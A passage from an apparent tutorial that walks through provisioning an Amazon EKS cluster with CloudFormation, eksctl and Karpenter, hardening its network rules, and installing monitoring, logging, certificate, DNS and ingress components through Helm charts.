\"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Route53 entries and KMS key Parameters: BaseDomain: Description: \"Base domain where cluster domains + their subdomains will live - Ex: k8s.mylabs.dev\" Type: String ClusterFQDN: Description: \"Cluster FQDN (domain for all applications) - Ex: k01.k8s.mylabs.dev\" Type: String ClusterName: Description: \"Cluster Name - Ex: k01\" Type: String Resources: HostedZone: Type: AWS::Route53::HostedZone Properties: Name: !Ref ClusterFQDN RecordSet: Type: AWS::Route53::RecordSet Properties: HostedZoneName: !Sub \"${BaseDomain}.\" Name: !Ref ClusterFQDN Type: NS TTL: 60 ResourceRecords: !GetAtt HostedZone.NameServers KMSAlias: Type: AWS::KMS::Alias Properties: AliasName: !Sub \"alias/eks-${ClusterName}\" TargetKeyId: !Ref KMSKey KMSKey: Type: AWS::KMS::Key Properties: Description: !Sub \"KMS key for ${ClusterName} Amazon EKS\" EnableKeyRotation: true PendingWindowInDays: 7 KeyPolicy: Version: \"2012-10-17\" Id: !Sub \"eks-key-policy-${ClusterName}\" Statement: - Sid: Enable IAM User Permissions Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:root\" Action: kms:* Resource: \"*\" - Sid: Allow use of the key Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:role/aws-service-role/autoscaling.amazonaws.com/AWSServiceRoleForAutoScaling\" # The following roles needs to be enabled after the EKS cluster is created # aws-ebs-csi-driver + Karpenter should be able to use the KMS key # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-irsa-aws-ebs-csi-driver\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-iamservice-role\" Action: - kms:Encrypt - kms:Decrypt - kms:ReEncrypt* - kms:GenerateDataKey* - kms:DescribeKey Resource: \"*\" - Sid: Allow attachment of persistent resources Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:role/aws-service-role/autoscaling.amazonaws.com/AWSServiceRoleForAutoScaling\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-irsa-aws-ebs-csi-driver\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-iamservice-role\" Action: - kms:CreateGrant Resource: \"*\" Condition: Bool: kms:GrantIsForAWSResource: true Outputs: KMSKeyArn: Description: The ARN of the created KMS Key to encrypt EKS related services Value: !GetAtt KMSKey.Arn Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyArn\" KMSKeyId: Description: The ID of the created KMS Key to encrypt EKS related services Value: !Ref KMSKey Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyId\" EOF if [[ $(aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --query \"StackSummaries[?starts_with(StackName, \\`${CLUSTER_NAME}-route53-kms\\`) == \\`true\\`].StackName\" --output text) == \"\" ]]; then # shellcheck disable=SC2001 eval aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"BaseDomain=${BASE_DOMAIN} ClusterFQDN=${CLUSTER_FQDN} ClusterName=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" --tags \"${TAGS//,/ }\" fi # shellcheck disable=SC2016 AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-route53-kms\" --query 'Stacks[0].Outputs[? OutputKey==`KMSKeyArn` || OutputKey==`KMSKeyId`].{OutputKey:OutputKey,OutputValue:OutputValue}') AWS_KMS_KEY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyArn\\\") .OutputValue\") AWS_KMS_KEY_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyId\\\") .OutputValue\") After running the CloudFormation stack, you should see the following Route53 zones: Route53 k01.k8s.mylabs.dev zone Route53 k8s.mylabs.dev zone You should also see the following KMS key: KMS key Create Amazon EKS I will use eksctl to create the Amazon EKS cluster. tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} tags: karpenter.sh/discovery: ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") availabilityZones: - ${AWS_DEFAULT_REGION}a - ${AWS_DEFAULT_REGION}b iam: withOIDC: true serviceAccounts: - metadata: name: aws-for-fluent-bit namespace: aws-for-fluent-bit attachPolicyARNs: - arn:aws:iam::aws:policy/CloudWatchAgentServerPolicy roleName: eksctl-${CLUSTER_NAME}-irsa-aws-for-fluent-bit - metadata: name: ebs-csi-controller-sa namespace: aws-ebs-csi-driver wellKnownPolicies: ebsCSIController: true roleName: eksctl-${CLUSTER_NAME}-irsa-aws-ebs-csi-driver - metadata: name: cert-manager namespace: cert-manager wellKnownPolicies: certManager: true roleName: eksctl-${CLUSTER_NAME}-irsa-cert-manager - metadata: name: external-dns namespace: external-dns wellKnownPolicies: externalDNS: true roleName: eksctl-${CLUSTER_NAME}-irsa-external-dns # Allow users which are consuming the AWS_ROLE_TO_ASSUME to access the EKS iamIdentityMappings: - arn: arn:aws:iam::${AWS_ACCOUNT_ID}:role/admin groups: - system:masters username: admin karpenter: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ version: v0.31.4 createServiceAccount: true withSpotInterruptionQueue: true addons: - name: vpc-cni version: latest configurationValues: |- enableNetworkPolicy: \"true\" env: ENABLE_PREFIX_DELEGATION: \"true\" - name: kube-proxy - name: coredns managedNodeGroups: - name: mng01-ng amiFamily: Bottlerocket # Minimal instance type for running add-ons + karpenter - ARM t4g.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly # Minimal instance type for running add-ons + karpenter - X86 t3a.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly instanceType: t4g.medium # Due to karpenter we need 2 instances desiredCapacity: 2 availabilityZones: - ${AWS_DEFAULT_REGION}a minSize: 2 maxSize: 5 volumeSize: 20 disablePodIMDS: true volumeEncrypted: true volumeKmsKeyID: ${AWS_KMS_KEY_ID} maxPodsPerNode: 110 privateNetworking: true bottlerocket: settings: kubernetes: seccomp-default: true secretsEncryption: keyARN: ${AWS_KMS_KEY_ARN} cloudWatch: clusterLogging: logRetentionInDays: 1 enableTypes: - all EOF Get the kubeconfig file to access the cluster: if [[ ! -s \"${KUBECONFIG}\" ]]; then if ! eksctl get clusters --name=\"${CLUSTER_NAME}\" &amp;&gt; /dev/null; then eksctl create cluster --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" --kubeconfig \"${KUBECONFIG}\" # Add roles created by eksctl to the KMS policy to allow aws-ebs-csi-driver work with encrypted EBS volumes sed -i \"s@# \\(- \\!Sub \\\"arn:aws:iam::\\${AWS::AccountId}:role/eksctl-\\${ClusterName}.*\\)@\\1@\" \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" eval aws cloudformation update-stack \\ --parameters \"ParameterKey=BaseDomain,ParameterValue=${BASE_DOMAIN} ParameterKey=ClusterFQDN,ParameterValue=${CLUSTER_FQDN} ParameterKey=ClusterName,ParameterValue=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms\" --template-body \"file://${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" else eksctl utils write-kubeconfig --cluster=\"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" fi fi aws eks update-kubeconfig --name=\"${CLUSTER_NAME}\" The sed command used earlier modified the aws-cf-route53-kms.yml file by incorporating the newly established IAM roles (eksctl-k01-irsa-aws-ebs-csi-driver and eksctl-k01-iamservice-role), enabling them to utilize the KMS key. KMS key with new IAM roles AWS_VPC_ID=$(aws ec2 describe-vpcs --filters \"Name=tag:alpha.eksctl.io/cluster-name,Values=${CLUSTER_NAME}\" --query 'Vpcs[*].VpcId' --output text) AWS_SECURITY_GROUP_ID=$(aws ec2 describe-security-groups --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" \"Name=group-name,Values=default\" --query 'SecurityGroups[*].GroupId' --output text) AWS_NACL_ID=$(aws ec2 describe-network-acls --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" --query 'NetworkAcls[*].NetworkAclId' --output text) Enhance the security posture of the EKS cluster by addressing the following concerns: The default security group should have no rules configured: aws ec2 revoke-security-group-egress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --cidr 0.0.0.0/0 | jq || true aws ec2 revoke-security-group-ingress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --source-group \"${AWS_SECURITY_GROUP_ID}\" | jq || true The VPC NACL allows unrestricted SSH access, and the VPC NACL allows unrestricted RDP access: aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 1 --protocol tcp --port-range \"From=22,To=22\" --cidr-block 0.0.0.0/0 --rule-action Deny aws ec2 create-network-acl-entry --network-acl-id \"${AWS_NACL_ID}\" --ingress --rule-number 2 --protocol tcp --port-range \"From=3389,To=3389\" --cidr-block 0.0.0.0/0 --rule-action Deny The namespace does not have a PSS level assigned: kubectl label namespace default pod-security.kubernetes.io/enforce=baseline Karpenter Karpenter is a Kubernetes node autoscaler built for flexibility, performance, and simplicity. Configure Karpenter by applying the following provisioner definition: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-provisioner.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1alpha5 kind: Provisioner metadata: name: default spec: consolidation: enabled: true requirements: - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: kubernetes.io/arch operator: In values: [\"amd64\", \"arm64\"] - key: \"topology.kubernetes.io/zone\" operator: In values: [\"${AWS_DEFAULT_REGION}a\"] - key: karpenter.k8s.aws/instance-family operator: In values: [\"t3a\", \"t4g\"] kubeletConfiguration: maxPods: 110 # Resource limits constrain the total size of the cluster. # Limits prevent Karpenter from creating new instances once the limit is exceeded. limits: resources: cpu: 8 memory: 32Gi providerRef: name: default # Labels are arbitrary key-values that are applied to all nodes labels: managedBy: karpenter provisioner: default --- apiVersion: karpenter.k8s.aws/v1alpha1 kind: AWSNodeTemplate metadata: name: default spec: amiFamily: Bottlerocket subnetSelector: karpenter.sh/discovery: ${CLUSTER_NAME} securityGroupSelector: karpenter.sh/discovery: ${CLUSTER_NAME} blockDeviceMappings: - deviceName: /dev/xvda ebs: volumeSize: 2Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} - deviceName: /dev/xvdb ebs: volumeSize: 20Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} tags: KarpenerProvisionerName: \"default\" Name: \"${CLUSTER_NAME}-karpenter\" $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") EOF aws-node-termination-handler The AWS Node Termination Handler gracefully handles EC2 instance shutdowns within Kubernetes. It is not needed when using EKS managed node groups, as discussed in Use with managed node groups. snapshot-controller Install the Volume Snapshot Custom Resource Definitions (CRDs): kubectl apply --kustomize 'https://github.com/kubernetes-csi/external-snapshotter//client/config/crd/?ref=v8.1.0' Install the volume snapshot controller snapshot-controller Helm chart and modify its default values: # renovate: datasource=helm depName=snapshot-controller registryUrl=https://piraeus.io/helm-charts/ SNAPSHOT_CONTROLLER_HELM_CHART_VERSION=\"2.2.0\" helm repo add --force-update piraeus-charts https://piraeus.io/helm-charts/ helm upgrade --wait --install --version \"${SNAPSHOT_CONTROLLER_HELM_CHART_VERSION}\" --namespace snapshot-controller --create-namespace snapshot-controller piraeus-charts/snapshot-controller kubectl label namespace snapshot-controller pod-security.kubernetes.io/enforce=baseline aws-ebs-csi-driver The Amazon Elastic Block Store (Amazon EBS) Container Storage Interface (CSI) Driver provides a CSI interface used by Container Orchestrators to manage the lifecycle of Amazon EBS volumes. (The ebs-csi-controller-sa ServiceAccount was created by eksctl) Install the Amazon EBS CSI Driver aws-ebs-csi-driver Helm chart and modify its default values: # renovate: datasource=helm depName=aws-ebs-csi-driver registryUrl=https://kubernetes-sigs.github.io/aws-ebs-csi-driver AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION=\"2.28.1\" helm repo add --force-update aws-ebs-csi-driver https://kubernetes-sigs.github.io/aws-ebs-csi-driver tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" &lt;&lt; EOF controller: enableMetrics: false serviceMonitor: forceEnable: true k8sTagClusterId: ${CLUSTER_NAME} extraVolumeTags: \"eks:cluster-name\": ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") serviceAccount: create: false name: ebs-csi-controller-sa region: ${AWS_DEFAULT_REGION} node: securityContext: # The node pod must be run as root to bind to the registration/driver sockets runAsNonRoot: false storageClasses: - name: gp3 annotations: storageclass.kubernetes.io/is-default-class: \"true\" parameters: encrypted: \"true\" kmskeyid: ${AWS_KMS_KEY_ARN} volumeSnapshotClasses: - name: ebs-vsc annotations: snapshot.storage.kubernetes.io/is-default-class: \"true\" deletionPolicy: Delete EOF helm upgrade --install --version \"${AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION}\" --namespace aws-ebs-csi-driver --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" aws-ebs-csi-driver aws-ebs-csi-driver/aws-ebs-csi-driver Delete the gp2 StorageClass, as gp3 will be used instead: kubectl delete storageclass gp2 || true mailpit Mailpit will be used to receive email alerts from the Prometheus. Install mailpit helm chart and modify the default values: # renovate: datasource=helm depName=mailpit registryUrl=https://jouve.github.io/charts/ MAILPIT_HELM_CHART_VERSION=\"0.14.0\" helm repo add --force-update jouve https://jouve.github.io/charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" &lt;&lt; EOF ingress: enabled: true annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/sj26/mailcatcher/main/assets/images/logo_large.png forecastle.stakater.com/appName: Mailpit nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri ingressClassName: nginx hostname: mailpit.${CLUSTER_FQDN} EOF helm upgrade --install --version \"${MAILPIT_HELM_CHART_VERSION}\" --namespace mailpit --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-mailpit.yml\" mailpit jouve/mailpit kubectl label namespace mailpit pod-security.kubernetes.io/enforce=baseline kube-prometheus-stack Prometheus should be one of the initial applications installed on the Kubernetes cluster because numerous Kubernetes services and applications can export metrics to it. The kube-prometheus-stack is a collection of Kubernetes manifests, Grafana dashboards, and Prometheus rules. It‚Äôs combined with documentation and scripts to provide easy-to-operate, end-to-end Kubernetes cluster monitoring with Prometheus using the Prometheus Operator. Install the kube-prometheus-stack Helm chart and modify its default values: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" helm repo add --force-update prometheus-community https://prometheus-community.github.io/helm-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" &lt;&lt; EOF defaultRules: rules: etcd: false kubernetesSystem: false kubeScheduler: false alertmanager: config: global: smtp_smarthost: \"mailpit-smtp.mailpit.svc.cluster.local:25\" smtp_from: \"alertmanager@${CLUSTER_FQDN}\" route: group_by: [\"alertname\", \"job\"] receiver: email routes: - receiver: 'null' matchers: - alertname =~ \"InfoInhibitor|Watchdog\" - receiver: email matchers: - severity =~ \"warning|critical\" receivers: - name: email email_configs: - to: \"notification@${CLUSTER_FQDN}\" require_tls: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/alert-manager.png forecastle.stakater.com/appName: Alert Manager nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri hosts: - alertmanager.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - alertmanager.${CLUSTER_FQDN} # https://github.com/grafana/helm-charts/blob/main/charts/grafana/values.yaml grafana: defaultDashboardsEnabled: false serviceMonitor: enabled: true ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/stakater/ForecastleIcons/master/grafana.png forecastle.stakater.com/appName: Grafana nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/configuration-snippet: | auth_request_set \\$email \\$upstream_http_x_auth_request_email; proxy_set_header X-Email \\$email; hosts: - grafana.${CLUSTER_FQDN} paths: [\"/\"] pathType: ImplementationSpecific tls: - hosts: - grafana.${CLUSTER_FQDN} datasources: datasource.yaml: apiVersion: 1 datasources: - name: Prometheus type: prometheus url: http://kube-prometheus-stack-prometheus.kube-prometheus-stack:9090/ access: proxy isDefault: true dashboardProviders: dashboardproviders.yaml: apiVersion: 1 providers: - name: \"default\" orgId: 1 folder: \"\" type: file disableDeletion: false editable: true options: path: /var/lib/grafana/dashboards/default dashboards: default: 1860-node-exporter-full: # renovate: depName=\"Node Exporter Full\" gnetId: 1860 revision: 36 datasource: Prometheus 3662-prometheus-2-0-overview: # renovate: depName=\"Prometheus 2.0 Overview\" gnetId: 3662 revision: 2 datasource: Prometheus 9852-stians-disk-graphs: # renovate: depName=\"node-exporter disk graphs\" gnetId: 9852 revision: 1 datasource: Prometheus 12006-kubernetes-apiserver: # renovate: depName=\"Kubernetes apiserver\" gnetId: 12006 revision: 1 datasource: Prometheus 9614-nginx-ingress-controller: # renovate: depName=\"NGINX Ingress controller\" gnetId: 9614 revision: 1 datasource: Prometheus 11875-kubernetes-ingress-nginx-eks: # renovate: depName=\"Kubernetes Ingress Nginx - EKS\" gnetId: 11875 revision: 1 datasource: Prometheus 15038-external-dns: # renovate: depName=\"External-dns\" gnetId: 15038 revision: 3 datasource: Prometheus 14314-kubernetes-nginx-ingress-controller-nextgen-devops-nirvana: # renovate: depName=\"Kubernetes Nginx Ingress Prometheus NextGen\" gnetId: 14314 revision: 2 datasource: Prometheus 13473-portefaix-kubernetes-cluster-overview: # renovate: depName=\"Portefaix / Kubernetes cluster Overview\" gnetId: 13473 revision: 2 datasource: Prometheus # https://grafana.com/orgs/imrtfm/dashboards - https://github.com/dotdc/grafana-dashboards-kubernetes 15760-kubernetes-views-pods: # renovate: depName=\"Kubernetes / Views / Pods\" gnetId: 15760 revision: 26 datasource: Prometheus 15757-kubernetes-views-global: # renovate: depName=\"Kubernetes / Views / Global\" gnetId: 15757 revision: 37 datasource: Prometheus 15758-kubernetes-views-namespaces: # renovate: depName=\"Kubernetes / Views / Namespaces\" gnetId: 15758 revision: 34 datasource: Prometheus 15759-kubernetes-views-nodes: # renovate: depName=\"Kubernetes / Views / Nodes\" gnetId: 15759 revision: 29 datasource: Prometheus 15761-kubernetes-system-api-server: # renovate: depName=\"Kubernetes / System / API Server\" gnetId: 15761 revision: 16 datasource: Prometheus 15762-kubernetes-system-coredns: # renovate: depName=\"Kubernetes / System / CoreDNS\" gnetId: 15762 revision: 17 datasource: Prometheus 19105-prometheus: # renovate: depName=\"Prometheus\" gnetId: 19105 revision: 3 datasource: Prometheus 16237-cluster-capacity: # renovate: depName=\"Cluster Capacity (Karpenter)\" gnetId: 16237 revision: 1 datasource: Prometheus 16236-pod-statistic: # renovate: depName=\"Pod Statistic (Karpenter)\" gnetId: 16236 revision: 1 datasource: Prometheus 19268-prometheus: # renovate: depName=\"Prometheus All Metrics\" gnetId: 19268 revision: 1 datasource: Prometheus 18855-fluent-bit: # renovate: depName=\"Fluent Bit\" gnetId: 18855 revision: 1 datasource: Prometheus grafana.ini: analytics: check_for_updates: false server: root_url: https://grafana.${CLUSTER_FQDN} # Use oauth2-proxy instead of default Grafana Oauth auth.basic: enabled: false auth.proxy: enabled: true header_name: X-Email header_property: email users: auto_assign_org_role: Admin smtp: enabled: true host: \"mailpit-smtp.mailpit.svc.cluster.local:25\" from_address: grafana@${CLUSTER_FQDN} networkPolicy: enabled: true kubeControllerManager: enabled: false kubeEtcd: enabled: false kubeScheduler: enabled: false kubeProxy: enabled: false kube-state-metrics: networkPolicy: enabled: true selfMonitor: enabled: true prometheus-node-exporter: networkPolicy: enabled: true prometheusOperator: networkPolicy: enabled: true prometheus: networkPolicy: enabled: false ingress: enabled: true ingressClassName: nginx annotations: forecastle.stakater.com/expose: \"true\" forecastle.stakater.com/icon: https://raw.githubusercontent.com/cncf/artwork/master/projects/prometheus/icon/color/prometheus-icon-color.svg forecastle.stakater.com/appName: Prometheus nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri paths: [\"/\"] pathType: ImplementationSpecific hosts: - prometheus.${CLUSTER_FQDN} tls: - hosts: - prometheus.${CLUSTER_FQDN} prometheusSpec: externalLabels: cluster: ${CLUSTER_FQDN} externalUrl: https://prometheus.${CLUSTER_FQDN} ruleSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false podMonitorSelectorNilUsesHelmValues: false retentionSize: 1GB walCompression: true storageSpec: volumeClaimTemplate: spec: storageClassName: gp3 accessModes: [\"ReadWriteOnce\"] resources: requests: storage: 2Gi EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack karpenter Karpenter automatically launches appropriately sized compute resources to handle your cluster‚Äôs applications. Customize the Karpenter default installation by upgrading its Helm chart and modifying the default values: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ KARPENTER_HELM_CHART_VERSION=\"v0.31.4\" tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" &lt;&lt; EOF replicas: 1 serviceMonitor: enabled: true settings: aws: enablePodENI: true reservedENIs: \"1\" EOF helm upgrade --install --version \"${KARPENTER_HELM_CHART_VERSION}\" --namespace karpenter --reuse-values --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-karpenter.yml\" karpenter oci://public.ecr.aws/karpenter/karpenter kubectl label namespace karpenter pod-security.kubernetes.io/enforce=baseline aws-for-fluent-bit Fluent Bit is an open-source log processor and forwarder that allows you to collect data, like metrics and logs, from different sources, enrich it with filters, and send it to multiple destinations. Install the aws-for-fluent-bit Helm chart and modify its default values: # renovate: datasource=helm depName=aws-for-fluent-bit registryUrl=https://aws.github.io/eks-charts AWS_FOR_FLUENT_BIT_HELM_CHART_VERSION=\"0.1.32\" helm repo add --force-update eks https://aws.github.io/eks-charts/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-for-fluent-bit.yml\" &lt;&lt; EOF cloudWatchLogs: region: ${AWS_DEFAULT_REGION} logGroupTemplate: \"/aws/eks/${CLUSTER_NAME}/cluster\" logStreamTemplate: \"\\$kubernetes['namespace_name'].\\$kubernetes['pod_name']\" serviceAccount: create: false name: aws-for-fluent-bit serviceMonitor: enabled: true extraEndpoints: - port: metrics path: /metrics interval: 30s scrapeTimeout: 10s scheme: http EOF helm upgrade --install --version \"${AWS_FOR_FLUENT_BIT_HELM_CHART_VERSION}\" --namespace aws-for-fluent-bit --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-for-fluent-bit.yml\" aws-for-fluent-bit eks/aws-for-fluent-bit cert-manager cert-manager adds certificates and certificate issuers as resource types in Kubernetes clusters and simplifies the process of obtaining, renewing, and using those certificates. The cert-manager ServiceAccount was created by eksctl. Install the cert-manager Helm chart and modify its default values: # renovate: datasource=helm depName=cert-manager registryUrl=https://charts.jetstack.io CERT_MANAGER_HELM_CHART_VERSION=\"1.14.4\" helm repo add --force-update jetstack https://charts.jetstack.io tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" &lt;&lt; EOF installCRDs: true serviceAccount: create: false name: cert-manager extraArgs: - --cluster-resource-namespace=cert-manager - --enable-certificate-owner-ref=true securityContext: fsGroup: 1001 prometheus: servicemonitor: enabled: true webhook: networkPolicy: enabled: true EOF helm upgrade --install --version \"${CERT_MANAGER_HELM_CHART_VERSION}\" --namespace cert-manager --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cert-manager.yml\" cert-manager jetstack/cert-manager kubectl label namespace cert-manager pod-security.kubernetes.io/enforce=baseline Add ClusterIssuers for the Let‚Äôs Encrypt staging environment: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-staging-dns namespace: cert-manager labels: letsencrypt: staging spec: acme: server: https://acme-staging-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-staging-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: region: ${AWS_DEFAULT_REGION} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all Create the certificate: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-staging.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-staging namespace: cert-manager labels: letsencrypt: staging spec: secretName: ingress-cert-staging secretTemplate: labels: letsencrypt: staging issuerRef: name: letsencrypt-staging-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF external-dns ExternalDNS synchronizes exposed Kubernetes Services and Ingresses with DNS providers. ExternalDNS will manage the DNS records. The external-dns ServiceAccount was created by eksctl. Install the external-dns Helm chart and modify its default values: # renovate: datasource=helm depName=external-dns registryUrl=https://kubernetes-sigs.github.io/external-dns/ EXTERNAL_DNS_HELM_CHART_VERSION=\"1.14.3\" helm repo add --force-update external-dns https://kubernetes-sigs.github.io/external-dns/ tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" &lt;&lt; EOF domainFilters: - ${CLUSTER_FQDN} interval: 20s policy: sync serviceAccount: create: false name: external-dns serviceMonitor: enabled: true EOF helm upgrade --install --version \"${EXTERNAL_DNS_HELM_CHART_VERSION}\" --namespace external-dns --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-external-dns.yml\" external-dns external-dns/external-dns kubectl label namespace external-dns pod-security.kubernetes.io/enforce=baseline ingress-nginx ingress-nginx is an Ingress controller for Kubernetes that uses nginx as a reverse proxy and load balancer. Install the ingress-nginx Helm chart and modify its default values: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.10.0\" kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-staging helm repo add --force-update ingress-nginx https://kubernetes.github.io/ingress-nginx tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" &lt;&lt; EOF controller: allowSnippetAnnotations: true ingressClassResource: default: true admissionWebhooks: networkPolicyEnabled: true extraArgs: default-ssl-certificate: \"cert-manager/ingress-cert-staging\" service: annotations: service.beta.kubernetes.io/aws-load-balancer-type: nlb service.beta.kubernetes.io/aws-load-balancer-additional-resource-tags: ${TAGS//\\'/} metrics: enabled: true serviceMonitor: enabled: true prometheusRule: enabled: true rules: - alert: NGINXConfigFailed expr: count(nginx_ingress_controller_config_last_reload_successful == 0) &gt; 0 for: 1s labels: severity: critical annotations: description: bad ingress config - nginx config test failed summary: uninstall the latest ingress changes to allow config reloads to resume - alert: NGINXCertificateExpiry expr: (avg(nginx_ingress_controller_ssl_expire_time_seconds) by (host) - time()) &lt; 604800 for: 1s labels: severity: critical annotations: description: ssl certificate(s) will expire in less then a week summary: renew expiring certificates to avoid downtime - alert: NGINXTooMany500s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"5.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 5XXs summary: More than 5% of all requests returned 5XX, this requires your attention - alert: NGINXTooMany400s expr: 100 * ( sum( 